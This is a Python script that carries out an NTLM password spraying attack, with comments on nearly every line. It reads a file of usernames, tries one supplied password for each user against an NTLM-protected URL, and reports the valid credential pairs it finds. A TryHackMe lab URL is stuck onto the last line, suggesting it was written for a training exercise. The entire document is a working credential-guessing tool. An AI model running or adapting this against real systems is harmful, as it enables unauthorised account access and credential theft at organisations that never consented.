#!/usr/bin/python3  # Shebang line that indicates this script should be run with Python 3

import requests  # Importing the requests library to handle HTTP requests
from requests_ntlm import HttpNtlmAuth  # Importing NTLM authentication from requests_ntlm for NTLM-based authentication
import sys  # Importing sys to access command-line arguments and system-specific parameters
import argparse  # Importing argparse for command-line argument parsing

# Class definition for NTLMSprayer
class NTLMSprayer:
    def __init__(self, fqdn):
        # Constructor that initializes the NTLMSprayer class
        self.HTTP_AUTH_FAILED_CODE = 401  # HTTP status code for unauthorized
        self.HTTP_AUTH_SUCCEED_CODE = 200  # HTTP status code for success
        self.verbose = True  # Boolean to control verbose output
        self.fqdn = fqdn  # Fully Qualified Domain Name passed during class initialization

    def load_users(self, userfile):
        # Method to load usernames from a specified file
        self.users = []  # Initialize an empty list to store usernames
        with open(userfile, 'r') as f:  # Open the user file in read mode
            lines = f.readlines()  # Read all lines from the file
            for line in lines:  # Iterate over each line
                self.users.append(line.strip())  # Remove whitespace and add to the user list

    def password_spray(self, password, url):
        # Method to perform the password spraying attack
        print(f"[*] Starting passwords spray attack using the following password: {password}")  # Print starting message
        count = 0  # Initialize a counter for valid credentials found
        for user in self.users:  # Iterate over each user loaded from the file
            # Attempt to authenticate using the NTLM authentication method
            response = requests.get(url, auth=HttpNtlmAuth(f"{self.fqdn}\\{user}", password))
            # Check if the response status code indicates a successful authentication
            if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                print(f"[+] Valid credential pair found! Username: {user} Password: {password}")  # Print valid credentials
                count += 1  # Increment the valid credentials counter
                continue  # Skip to the next user
            # Check if the response status code indicates a failed authentication and if verbose mode is enabled
            if self.verbose and response.status_code == self.HTTP_AUTH_FAILED_CODE:
                print(f"[-] Failed login with Username: {user}")  # Print failure message for this user

        # Print the total number of valid credentials found after the attack completes
        print(f"[*] Password spray attack completed, {count} valid credential pairs found")

# Main function to handle command-line execution
def main():
    # Create an ArgumentParser object for command-line arguments
    parser = argparse.ArgumentParser(description='Perform an NTLM password spray attack.')
    parser.add_argument('-u', '--userfile', required=True, help='Path to the user file')  # Argument for user file path
    parser.add_argument('-f', '--fqdn', required=True, help='Fully Qualified Domain Name (FQDN)')  # Argument for FQDN
    parser.add_argument('-p', '--password', required=True, help='Password to use for spraying')  # Argument for password
    parser.add_argument('-a', '--attackurl', required=True, help='URL of the target for the attack')  # Argument for attack URL

    args = parser.parse_args()  # Parse command-line arguments

    # Start the password spray attack using the provided arguments
    sprayer = NTLMSprayer(args.fqdn)  # Create an instance of NTLMSprayer with the specified FQDN
    sprayer.load_users(args.userfile)  # Load users from the specified file
    sprayer.password_spray(args.password, args.attackurl)  # Perform the password spraying attack

# Check if this script is being executed directly (as opposed to being imported as a module)
if __name__ == "__main__":
    main()  # Call the main function to execute the scripthttp://ntlmauth.za.tryhackme.com/
